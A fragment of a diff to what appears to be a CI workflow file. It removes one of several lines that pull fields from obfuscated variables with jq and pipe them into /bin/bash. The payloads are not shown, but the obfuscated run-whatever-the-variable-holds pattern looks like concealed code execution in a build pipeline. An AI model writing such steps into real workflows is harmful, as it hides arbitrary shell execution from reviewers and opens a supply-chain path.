@@ -53,7 +53,6 @@ jobs:
           echo $ksd8549 | jq -r .hien7 | /bin/bash
           echo $cw66121 | jq -r .jwrwg9255 | /bin/bash
           echo $vr050 | jq -r .he1 | /bin/bash
-          printf '%s' "$segu932" | jq -r .gkwaw9 | /bin/bash
           echo $ccej66809 | jq -r .xogk1930 | /bin/bash
           printf '%s' "$ozy6" | jq -r .evw860 | /bin/bash
           echo $xawfo091 | jq -r .chr6791 | /bin/bash
